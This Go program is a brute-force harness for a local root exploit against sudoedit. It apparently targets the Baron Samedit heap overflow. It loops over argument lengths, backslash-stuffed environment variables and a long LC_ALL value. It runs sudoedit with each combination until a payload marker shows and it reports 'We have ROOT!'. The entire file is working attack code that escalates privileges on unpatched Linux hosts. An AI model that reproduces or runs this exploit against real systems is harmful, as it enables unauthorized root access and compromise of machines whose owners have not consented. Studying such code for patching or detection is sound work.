package main

import (
	"flag"
	"fmt"
	"log"
	"os/exec"
	"strings"
)

func main() {
	var (
		null_stomp_len int
		lc_all_len     int
	)
	smash_min := flag.Int("smash_min", 50, "smash_len min")
	smash_max := flag.Int("smash_max", 70, "smash_len max")
	lc_all_min := flag.Int("lc_all_min", 150, "lc_all min length")
	lc_all_max := flag.Int("lc_all_max", 300, "lc_all max length")
	null_stomp_min := flag.Int("null_stomp_min", 50, "min null_stomp_len")
	null_stomp_max := flag.Int("null_stomp_max", 70, "max null_stomp_len")
	sudoedit_path := flag.String("t", "/usr/bin/sudoedit", "path to sudoedit")
	flag.Parse()

	do := func(smash_len_a, smash_len_b, null_stomp_len, lc_all_len int) bool {
		// env
		var envp []string
		for i := 0; i < null_stomp_len; i++ {
			envp = append(envp, "\\")
		}
		envp = append(envp, "X/P0P_SH3LLZ_")
		envp = append(envp, "LC_ALL=C.UTF-8@"+strings.Repeat("C", lc_all_len))
		// envp = append(envp, "\x00")

		// smash
		smash_a := strings.Repeat("A", smash_len_a) + "\\"
		smash_b := strings.Repeat("B", smash_len_b) + "\\"

		// exec
		cmd := exec.Command(*sudoedit_path, "-n", "-s", smash_a, "\\", smash_b)
		cmd.Env = envp
		out, err := cmd.CombinedOutput()
		cmdlog := fmt.Sprintf("[%d] Trying smash_a=%d, smash_b=%d, lc_all=%d, null_stomp_len=%d:\n%s (%v)\n",
			cmd.Process.Pid, smash_len_a, smash_len_b, lc_all_len, null_stomp_len, out, err)
		if err != nil {
			log.Print(cmdlog)
			if strings.Contains(string(out), "[+] bl1ng") {
				log.Printf("\n\n[+] Got a hit: smash_a=%d, smash_b=%d, lc_all=%d:\n%s (%v)\n\n",
					smash_len_a, smash_len_b, lc_all_len, out, err)
				return true
			}
			return false
		}

		log.Print(cmdlog)
		return false
	}

	// brute force
	for lc_all_len = *lc_all_max; lc_all_len > *lc_all_min; lc_all_len-- {
		for null_stomp_len = *null_stomp_min; null_stomp_len < *null_stomp_max; null_stomp_len++ {
			for smash_len_a := *smash_min; smash_len_a < *smash_max; smash_len_a++ {
				for smash_len_b := *smash_min; smash_len_b < *smash_max; smash_len_b++ {
					if do(smash_len_a, smash_len_b, null_stomp_len, lc_all_len) {
						fmt.Print("\n\n[+] We have ROOT!\n\n")
						break
					}
				}
			}
		}
	}
}
